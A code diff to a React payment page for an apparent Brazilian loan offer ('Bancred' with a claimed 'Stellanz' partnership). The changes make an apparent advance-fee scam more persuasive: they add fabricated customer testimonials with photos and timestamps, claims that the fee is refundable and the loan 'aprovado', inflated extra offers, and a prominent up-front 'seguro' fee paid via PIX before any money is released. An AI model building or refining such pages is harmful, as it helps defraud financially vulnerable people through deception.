@@ -1,4 +1,4 @@
-import { useEffect, useMemo, useState } from "react";
+import { useMemo, useState } from "react";
 import { useNavigate, useSearchParams } from "react-router-dom";
 import {
   ShieldCheck,
@@ -10,8 +10,18 @@ import {
   Loader2,
   X,
   Wallet,
+  Star,
+  CheckCircle2,
+  Lock,
 } from "lucide-react";
 import { useParadisePix } from "@/hooks/useParadisePix";
+import bancredLogo from "@/assets/bancred-logo.png";
+import stellanzLogo from "@/assets/stellanz-logo.svg";
+import cliente1 from "@/assets/cliente-1.jpeg";
+import cliente2 from "@/assets/cliente-2.jpeg";
+import cliente3 from "@/assets/cliente-3.jpeg";
+import cliente4 from "@/assets/cliente-4.jpeg";
+import cliente5 from "@/assets/cliente-5.jpeg";
 
 const fontStack = '"Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif';
 
@@ -21,15 +31,14 @@ const formatBRL = (n: number) =>
 const PixIcon = ({ size = 20 }: { size?: number }) => (
   <svg xmlns="http://www.w3.org/2000/svg" width={size} height={size} viewBox="0 0 315.63 315.63">
     <g transform="translate(-2394 -4352.093)">
-      <path d="M246.13,264.53A46.07,46.07,0,0,1,213.35,251L166,203.62a9,9,0,0,0-12.44,0l-47.51,47.51A46.09,46.09,0,0,1,73.27,264.7H64l60,60a48,48,0,0,0,67.81,0l60.12-60.13Z" transform="translate(2394.023 4329.001)" fill="#32bcad" />
-      <path d="M73.28,97.09a46.08,46.08,0,0,1,32.78,13.57l47.51,47.52a8.81,8.81,0,0,0,12.44,0l47.34-47.34a46,46,0,0,1,32.78-13.58h5.7L191.71,37.14a47.94,47.94,0,0,0-67.81,0L64,97.09Z" transform="translate(2394.023 4329.001)" fill="#32bcad" />
-      <path d="M301.56,147l-36.33-36.33a7,7,0,0,1-2.58.52H246.13a32.62,32.62,0,0,0-22.93,9.5L175.86,168a22.74,22.74,0,0,1-32.13,0L96.21,120.51A32.62,32.62,0,0,0,73.28,111H53a7.12,7.12,0,0,1-2.44-.49L14,147a48,48,0,0,0,0,67.81l36.48,36.48a6.85,6.85,0,0,1,2.44-.49H73.28a32.63,32.63,0,0,0,22.93-9.51l47.51-47.51c8.59-8.58,23.56-8.58,32.14,0l47.34,47.33a32.62,32.62,0,0,0,22.93,9.5h16.52a6.9,6.9,0,0,1,2.58.52l36.33-36.33a47.94,47.94,0,0,0,0-67.81" transform="translate(2394.023 4329.001)" fill="#32bcad" />
+      <path d="M246.13,264.53A46.07,46.07,0,0,1,213.35,251L166,203.62a9,9,0,0,0-12.44,0l-47.51,47.51A46.09,46.09,0,0,1,73.27,264.7H64l60,60a48,48,0,0,0,67.81,0l60.12-60.13Z" transform="translate(2394.023 4329.001)" fill="#fff" />
+      <path d="M73.28,97.09a46.08,46.08,0,0,1,32.78,13.57l47.51,47.52a8.81,8.81,0,0,0,12.44,0l47.34-47.34a46,46,0,0,1,32.78-13.58h5.7L191.71,37.14a47.94,47.94,0,0,0-67.81,0L64,97.09Z" transform="translate(2394.023 4329.001)" fill="#fff" />
+      <path d="M301.56,147l-36.33-36.33a7,7,0,0,1-2.58.52H246.13a32.62,32.62,0,0,0-22.93,9.5L175.86,168a22.74,22.74,0,0,1-32.13,0L96.21,120.51A32.62,32.62,0,0,0,73.28,111H53a7.12,7.12,0,0,1-2.44-.49L14,147a48,48,0,0,0,0,67.81l36.48,36.48a6.85,6.85,0,0,1,2.44-.49H73.28a32.63,32.63,0,0,0,22.93-9.51l47.51-47.51c8.59-8.58,23.56-8.58,32.14,0l47.34,47.33a32.62,32.62,0,0,0,22.93,9.5h16.52a6.9,6.9,0,0,1,2.58.52l36.33-36.33a47.94,47.94,0,0,0,0-67.81" transform="translate(2394.023 4329.001)" fill="#fff" />
     </g>
   </svg>
 );
 
 const calcSeguro = (valor: number) => {
-  // ~0.685% do valor — ajustado para bater com R$ 34,23 em R$ 5.000
   const total = +(valor * 0.006846).toFixed(2);
   const morte = +(total * 0.36).toFixed(2);
   const desemprego = +(total * 0.32).toFixed(2);
@@ -37,11 +46,63 @@ const calcSeguro = (valor: number) => {
   return { total, morte, desemprego, emergencia };
 };
 
+const beneficios = [
+  "Proteção em caso de morte ou invalidez",
+  "Proteção contra desemprego",
+  "Liberação imediata do valor total",
+  "100% reembolsável após quitação",
+  "Sem carência - vale desde o 1º dia",
+];
+
+const depoimentos = [
+  {
+    foto: cliente1,
+    nome: "Carla Mendes",
+    cidade: "Salvador, BA",
+    tempo: "há 2 horas",
+    valor: "R$ 8.500,00",
+    texto: "Confesso que estava com medo de pagar o seguro, mas em 12 minutos o dinheiro caiu na minha conta. Usei pra quitar umas dívidas atrasadas. Recomendo demais!",
+  },
+  {
+    foto: cliente2,
+    nome: "Patrícia Oliveira",
+    cidade: "Belo Horizonte, MG",
+    tempo: "há 5 horas",
+    valor: "R$ 12.000,00",
+    texto: "Já tinha tentado em vários bancos e fui negada. Aqui foi aprovado na hora, paguei o seguro pelo PIX e recebi rapidinho. Atendimento da Stellanz foi ótimo.",
+  },
+  {
+    foto: cliente3,
+    nome: "Beatriz Almeida",
+    cidade: "Curitiba, PR",
+    tempo: "há 1 dia",
+    valor: "R$ 6.200,00",
+    texto: "Achei que era golpe no começo kkk mas resolvi arriscar. Caiu certinho! Já indiquei pra minha mãe e pra minha irmã também.",
+  },
+  {
+    foto: cliente4,
+    nome: "Roberto Carvalho",
+    cidade: "Porto Alegre, RS",
+    tempo: "há 1 dia",
+    valor: "R$ 15.000,00",
+    texto: "Processo super transparente. O seguro da Stellanz me deixou tranquilo, principalmente pela proteção em caso de desemprego. Liberação foi imediata.",
+  },
+  {
+    foto: cliente5,
+    nome: "Diego Fernandes",
+    cidade: "São Paulo, SP",
+    tempo: "há 2 dias",
+    valor: "R$ 10.000,00",
+    texto: "Cara, eu tava precisando demais. Paguei o seguro 14h32 e às 14h47 já tava com o dinheiro. Surreal a velocidade.",
+  },
+];
+
 const Pagamento = () => {
   const [params] = useSearchParams();
   const navigate = useNavigate();
   const valor = Number(params.get("valor") || 5000);
   const nome = params.get("nome") || "";
+  const primeiroNome = nome.trim().split(" ")[0]?.toUpperCase() || "CLIENTE";
   const seguro = useMemo(() => calcSeguro(valor), [valor]);
 
   const [oferta, setOferta] = useState<"principal" | "extra1" | "extra2">("principal");
@@ -49,7 +110,7 @@ const Pagamento = () => {
   const [copied, setCopied] = useState(false);
 
   const valorOfertaExtra1 = 7000;
-  const valorOfertaExtra2 = 10000;
+  const valorOfertaExtra2 = 11000;
   const seguroExtra1 = useMemo(() => calcSeguro(valorOfertaExtra1), []);
   const seguroExtra2 = useMemo(() => calcSeguro(valorOfertaExtra2), []);
 
@@ -58,7 +119,9 @@ const Pagamento = () => {
   const seguroAtual =
     oferta === "principal" ? seguro : oferta === "extra1" ? seguroExtra1 : seguroExtra2;
 
-  const { create, reset, pix, loading: pixLoading, error: pixError, status } = useParadisePix(() => {
+  const parcela = (v: number) => v / 24 * (1 + 0.27);
+
+  const { create, reset, pix, loading: pixLoading, error: pixError } = useParadisePix(() => {
     navigate(`/up1?${params.toString()}`);
   });
 
@@ -93,18 +156,16 @@ const Pagamento = () => {
     }
   };
 
-  const OfferCard = ({
+  const OfferRow = ({
     id,
-    titulo,
     valorEmp,
     seg,
-    destaque,
+    principal,
   }: {
     id: "principal" | "extra1" | "extra2";
-    titulo: string;
     valorEmp: number;
     seg: ReturnType<typeof calcSeguro>;
-    destaque?: boolean;
+    principal?: boolean;
   }) => {
     const active = oferta === id;
     return (
@@ -115,18 +176,17 @@ const Pagamento = () => {
           width: "100%",
           background: "#fff",
           border: `2px solid ${active ? "#1C68E3" : "#E5E7EB"}`,
-          borderRadius: 16,
-          padding: 16,
+          borderRadius: 14,
+          padding: 14,
           textAlign: "left",
           cursor: "pointer",
           fontFamily: fontStack,
-          marginBottom: 12,
-          boxShadow: active ? "0 6px 18px -8px rgba(28,104,227,0.35)" : "none",
+          marginBottom: 10,
           transition: "border-color 0.2s",
         }}
       >
-        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", marginBottom: 6 }}>
-          <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
+        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start" }}>
+          <div style={{ display: "flex", alignItems: "flex-start", gap: 10, flex: 1 }}>
             <span
               style={{
                 width: 18,
@@ -137,22 +197,23 @@ const Pagamento = () => {
                 alignItems: "center",
                 justifyContent: "center",
                 flexShrink: 0,
+                marginTop: 4,
+                background: active ? "#fff" : "transparent",
               }}
             >
               {active && <span style={{ width: 8, height: 8, borderRadius: "50%", background: "#1C68E3" }} />}
             </span>
-            <span style={{ fontSize: 13, fontWeight: 600, color: "#111827" }}>{titulo}</span>
-          </div>
-          {destaque && (
-            <span style={{ fontSize: 10, fontWeight: 700, color: "#15803D", background: "#DCFCE7", padding: "3px 8px", borderRadius: 999, letterSpacing: 0.3 }}>
-              SUA OFERTA
-            </span>
-          )}
-        </div>
-        <div style={{ display: "flex", alignItems: "baseline", justifyContent: "space-between", marginTop: 6 }}>
-          <div>
-            <div style={{ fontSize: 24, fontWeight: 800, color: "#1C68E3", letterSpacing: -0.5 }}>{formatBRL(valorEmp)}</div>
-            <div style={{ fontSize: 11, color: "#6B7280", marginTop: 2 }}>Liberação imediata</div>
+            <div>
+              <div style={{ fontSize: 12, color: "#6B7280", marginBottom: 2 }}>
+                {principal ? "Valor aprovado para liberação" : "Você receberá"}
+              </div>
+              <div style={{ fontSize: 22, fontWeight: 800, color: "#1C68E3", letterSpacing: -0.5 }}>
+                {formatBRL(valorEmp)}
+              </div>
+              <div style={{ fontSize: 11, color: "#6B7280", marginTop: 2 }}>
+                24x de {formatBRL(parcela(valorEmp))}
+              </div>
+            </div>
           </div>
           <div style={{ textAlign: "right" }}>
             <div style={{ fontSize: 11, color: "#6B7280" }}>Seguro</div>
@@ -165,16 +226,80 @@ const Pagamento = () => {
 
   return (
     <div style={{ minHeight: "100dvh", background: "#F4F4F7", fontFamily: fontStack, color: "#111827", paddingBottom: showPix ? 0 : 32 }}>
-      <header style={{ background: "#fff", borderBottom: "1px solid #E5E7EB", padding: "14px 16px", textAlign: "center" }}>
-        <span style={{ fontSize: 22, fontWeight: 800, color: "#1C68E3", letterSpacing: -0.4 }}>Bancred</span>
+      {/* Header Bancred */}
+      <header style={{ background: "#fff", padding: "16px", textAlign: "center", borderBottom: "1px solid #E5E7EB" }}>
+        <img src={bancredLogo} alt="Bancred" style={{ height: 30, display: "inline-block" }} />
       </header>
 
-      <main style={{ padding: "18px 14px", maxWidth: 480, margin: "0 auto" }}>
-        <OfferCard id="principal" titulo="Você aprovado para empréstimo" valorEmp={valor} seg={seguro} destaque />
+      {/* Banner Stellanz */}
+      <section style={{ background: "linear-gradient(135deg, #1C68E3 0%, #1751B5 100%)", padding: "20px 16px 24px", color: "#fff", textAlign: "center" }}>
+        <div style={{ display: "flex", justifyContent: "flex-start", marginBottom: 14 }}>
+          <img src={stellanzLogo} alt="Stellanz" style={{ height: 26 }} />
+        </div>
+        <div style={{ fontSize: 15, fontWeight: 700, marginBottom: 4 }}>Parceria Oficial Stellanz</div>
+        <div style={{ fontSize: 13, opacity: 0.9 }}>Proteção garantida para seu empréstimo</div>
+      </section>
 
-        <div style={{ background: "#fff", border: "1px solid #E5E7EB", borderRadius: 16, padding: 16, marginBottom: 16 }}>
+      <main style={{ padding: "22px 14px", maxWidth: 480, margin: "0 auto" }}>
+        {/* Saudação */}
+        <h1 style={{ fontSize: 26, fontWeight: 800, textAlign: "center", marginBottom: 6, letterSpacing: -0.5 }}>
+          {primeiroNome}!
+        </h1>
+        <p style={{ fontSize: 15, color: "#374151", textAlign: "center", marginBottom: 22 }}>
+          Seu empréstimo está quase liberado
+        </p>
+
+        {/* Benefícios */}
+        <div style={{ background: "#fff", border: "1px solid #E5E7EB", borderRadius: 16, padding: 18, marginBottom: 18 }}>
+          <div style={{ fontSize: 15, fontWeight: 700, marginBottom: 12 }}>Benefícios inclusos no seguro:</div>
+          {beneficios.map((b) => (
+            <div key={b} style={{ display: "flex", alignItems: "center", gap: 10, padding: "7px 0", fontSize: 14, color: "#111827" }}>
+              <CheckCircle2 size={18} color="#16A34A" style={{ flexShrink: 0 }} /> {b}
+            </div>
+          ))}
+        </div>
+
+        {/* Social proof */}
+        <div style={{ background: "#fff", border: "1px solid #E5E7EB", borderRadius: 16, padding: 18, marginBottom: 18 }}>
+          <div style={{ display: "flex", alignItems: "center", gap: 8, fontSize: 15, fontWeight: 700, marginBottom: 14 }}>
+            <Star size={18} color="#F59E0B" fill="#F59E0B" /> Quem já recebeu está falando
+          </div>
+          {depoimentos.map((d, idx) => (
+            <div key={d.nome} style={{ background: "#F9FAFB", border: "1px solid #F3F4F6", borderRadius: 12, padding: 14, marginBottom: idx === depoimentos.length - 1 ? 0 : 12 }}>
+              <div style={{ display: "flex", alignItems: "flex-start", gap: 12, marginBottom: 10 }}>
+                <img src={d.foto} alt={d.nome} style={{ width: 48, height: 48, borderRadius: "50%", objectFit: "cover", flexShrink: 0 }} />
+                <div style={{ flex: 1, minWidth: 0 }}>
+                  <div style={{ display: "flex", alignItems: "center", gap: 6, fontSize: 14, fontWeight: 700, color: "#111827" }}>
+                    {d.nome}
+                    <span style={{ width: 14, height: 14, borderRadius: "50%", background: "#1C68E3", display: "inline-flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
+                      <Check size={9} color="#fff" strokeWidth={4} />
+                    </span>
+                  </div>
+                  <div style={{ fontSize: 12, color: "#6B7280", marginTop: 2 }}>
+                    {d.cidade} · {d.tempo}
+                  </div>
+                  <div style={{ display: "flex", gap: 1, marginTop: 4, color: "#F59E0B" }}>
+                    {[1, 2, 3, 4, 5].map((s) => (
+                      <Star key={s} size={12} fill="#F59E0B" stroke="#F59E0B" />
+                    ))}
+                  </div>
+                </div>
+                <span style={{ fontSize: 12, fontWeight: 700, color: "#fff", background: "#16A34A", padding: "5px 10px", borderRadius: 8, whiteSpace: "nowrap" }}>
+                  {d.valor}
+                </span>
+              </div>
+              <div style={{ fontSize: 13, color: "#374151", lineHeight: 1.55 }}>{d.texto}</div>
+            </div>
+          ))}
+        </div>
+
+        {/* Oferta principal */}
+        <OfferRow id="principal" valorEmp={valor} seg={seguro} principal />
+
+        {/* Detalhamento da tarifa */}
+        <div style={{ background: "#fff", border: "1px solid #E5E7EB", borderRadius: 16, padding: 16, marginBottom: 18 }}>
           <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 12, color: "#1C68E3", fontWeight: 700, fontSize: 14 }}>
-            <Info size={16} /> Detalhamento da Tarifa de Seguro
+            <Info size={16} /> Detalhamento da Tarifa do Seguro
           </div>
           {[
             { l: "Cobertura por morte e invalidez", v: seguroAtual.morte },
@@ -192,12 +317,20 @@ const Pagamento = () => {
           </div>
         </div>
 
+        {/* Ofertas extras */}
         <h2 style={{ fontSize: 15, fontWeight: 700, marginBottom: 12 }}>
-          Temos mais 2 ofertas aprovadas pro seu CPF:
+          Temos mais 2 ofertas aprovadas pra seu CPF:
         </h2>
+        <OfferRow id="extra1" valorEmp={valorOfertaExtra1} seg={seguroExtra1} />
+        <OfferRow id="extra2" valorEmp={valorOfertaExtra2} seg={seguroExtra2} />
 
-        <OfferCard id="extra1" titulo="Oferta turbinada" valorEmp={valorOfertaExtra1} seg={seguroExtra1} />
-        <OfferCard id="extra2" titulo="Oferta premium" valorEmp={valorOfertaExtra2} seg={seguroExtra2} />
+        {/* Valor a pagar destacado */}
+        <div style={{ textAlign: "center", marginTop: 24, marginBottom: 14 }}>
+          <div style={{ fontSize: 34, fontWeight: 800, color: "#16A34A", letterSpacing: -0.6 }}>
+            {formatBRL(seguroAtual.total)}
+          </div>
+          <div style={{ fontSize: 13, color: "#6B7280", marginTop: 2 }}>Pagamento único via PIX</div>
+        </div>
 
         <button
           type="button"
@@ -218,15 +351,19 @@ const Pagamento = () => {
             justifyContent: "center",
             gap: 10,
             fontFamily: fontStack,
-            minHeight: 54,
-            marginTop: 8,
+            minHeight: 56,
           }}
         >
-          <PixIcon size={20} /> Pagar {formatBRL(seguroAtual.total)} via PIX
+          <PixIcon size={22} /> Pagar seguro via PIX
         </button>
 
-        <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 6, fontSize: 12, color: "#6B7280", marginTop: 14 }}>
-          <ShieldCheck size={14} color="#16A34A" /> Pagamento 100% seguro com criptografia
+        <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: 6, marginTop: 14, fontSize: 12, color: "#6B7280" }}>
+          <div style={{ display: "inline-flex", alignItems: "center", gap: 6 }}>
+            <CheckCircle2 size={14} color="#16A34A" /> Pagamento reconhecido automaticamente
+          </div>
+          <div style={{ display: "inline-flex", alignItems: "center", gap: 6 }}>
+            <Lock size={13} color="#6B7280" /> Processo 100% seguro
+          </div>
         </div>
       </main>
 
@@ -262,7 +399,9 @@ const Pagamento = () => {
 
             <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 16 }}>
               <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
-                <PixIcon size={22} />
+                <span style={{ background: "#32BCAD", borderRadius: 8, padding: 4, display: "inline-flex" }}>
+                  <PixIcon size={18} />
+                </span>
                 <span style={{ fontSize: 18, fontWeight: 700 }}>Pagar com PIX</span>
               </div>
               <button
